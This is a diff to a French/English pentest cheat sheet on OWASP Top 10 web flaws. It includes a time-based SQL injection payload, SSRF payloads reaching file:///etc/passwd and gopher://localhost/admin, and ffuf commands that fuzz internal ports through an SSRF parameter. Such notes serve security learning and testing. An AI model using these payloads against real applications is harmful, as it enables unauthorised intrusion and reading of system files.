@@ -76,22 +76,26 @@ You can find payloads of Windows and linux with file uploads of this repositorie
   ```SQL
   SELECT * from artcile where id = '1' UNION SELECT sleep(1),2 from information_schema.columns where table_name = 'sqli_one' and table_name = 'users' and column_name = 'id';--
   ```
-  ##### Top 4 non-secure application
-  ##### Top 5 bad configuration
-  ##### Top 6 composant vulnerability
-  ##### Top 7 authentification failure
-  ##### Top 8 failure integrity data
-  ##### Top 9 journalisation defect
-  ## *Top 10*./ SSRF (Server-Side Request Forgery)
+  ## Top 4 non-secure application
+  ## Top 5 bad configuration
+  ## Top 6 composant vulnerability
+  ## Top 7 authentification failure
+  ## Top 8 failure integrity data
+  ## Top 9 journalisation defect
+  ## *Top 10*./ SSRF (Server-Side Request Forgery), SSTI (Server-Side Template Injection), SSI (Server-Side Includes)
+### SSRF
 Permet sur une application web (API) de faire une requete avec le server. (like preview button)
-Une fois la faille SSRF découverte on peut tester de faire des requetes interne comme :
+Une fois la faille SSRF découverte on peut tester de faire des requetes GEt ou POST comme :
 ```bash
-http://127.0.0.1:<port>/
-http://localhost/API/endpoint
-http://localhost/admin
-http://<common_cloud_IP_addr>/
+example=http://127.0.0.1:<port>/
+example=file:///etc/passwd
+example=gopher://localhost/admin
 ```
-Utiliser Burpsuite ou FFUF pour analyser les réponses server.
+utiliser FUFF pour le scan de port, ou scan d'endpoint 
 ```bash
-ffuf --request req.txt -w /path/wordlist -u http://example.com/
+ffuf -w nb.txt -u http://example.com/ -X POST -H "Content-type: application/x-www-form-urlencoded" -d "example=http://127.0.0.1:FUZZ/"
+ffuf -w /usr/shar/wordlists/seclists/Discovery/Web-content/burp -u http://example.com/ -X POST -H "Content-type: application/x-www-form-urlencoded" -d "example=http://example.com/FUZZ.php"
 ```
+### SSTI
+Permet d'utiliser le moteur de template d'une page pour executer du code 
+![Capture d'écran de mon projet](diagram.png)
